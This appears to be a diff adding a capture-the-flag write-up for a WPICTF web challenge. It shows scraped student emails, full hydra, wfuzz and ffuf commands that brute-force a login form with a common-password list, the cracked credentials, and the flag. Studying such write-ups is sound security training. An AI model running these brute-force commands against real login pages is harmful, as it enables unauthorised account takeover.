@@ -1,0 +1,40 @@
+Get emails from https://wpiadmin.wpictf.xyz/topStudents
+
+```
+colino@uupeye.edu
+calliep@uupeye.edu
+annar@uupeye.edu
+gaylenek@uupeye.edu
+dennisb@uupeye.edu
+sherrim@uupeye.edu
+adams@uupeye.edu
+```
+
+Fuzz
+
+hydra -L emails.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt wpiadmin.wpictf.xyz -t 64 https-post-form "/studLogin:inputUsername=^USER^&inputPassword=^PASS^:F=Invalid username/password" -V -o output
+
+=> 40 seconds found all with 1 false positive
+
+wfuzz -c -z file,emails.txt -z file,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -d "inputUsername=FUZZ&inputPassword=FUZ2Z" -t 128 --sc 302 https://wpiadmin.wpictf.xyz/studLogin
+
+=> 12 seconds found all with 0 false positive
+
+ffuf -c -w emails.txt:EMAIL -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASSWORD -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "inputUsername=EMAIL&inputPassword=PASSWORD" -u https://wpiadmin.wpictf.xyz/studLogin -mc 302 -t 128 -o output
+
+=> 4 seconds found all with 0 false positive
+
+
+```
+colino@uupeye.edu 123456
+sherrim@uupeye.edu 12345678
+gaylenek@uupeye.edu qwerty
+dennisb@uupeye.edu 123123
+calliep@uupeye.edu password 
+annar@uupeye.edu iloveyou
+adams@uupeye.edu soccer
+```
+
+login with dennisb@uupeye.edu:123123
+	WPI{1n53cUR3_5tud3Nts}
+
